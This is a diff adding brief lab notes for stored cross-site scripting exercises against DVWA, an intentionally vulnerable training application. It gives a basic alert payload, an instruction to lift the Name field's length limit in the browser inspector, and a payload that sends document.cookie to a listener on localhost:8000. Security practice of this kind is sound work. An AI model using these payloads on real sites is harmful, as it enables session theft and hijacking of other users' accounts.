@@ -1,0 +1,14 @@
+# Step 3: Basic Stored XSS Test
+# DVWA -> XSS (Stored)
+# Name: Attacker
+# Message:
+
+<script>alert('XSS Stored')</script>
+
+# Step 8: Advanced Stored XSS (Cookie Theft)
+# Right-click Name field -> Inspect -> change maxlength="10" to maxlength="100"
+# Name:
+
+Hacker<script>new Image().src='http://localhost:8000/?c='+document.cookie</script>
+
+# Message: Testing stored XSS
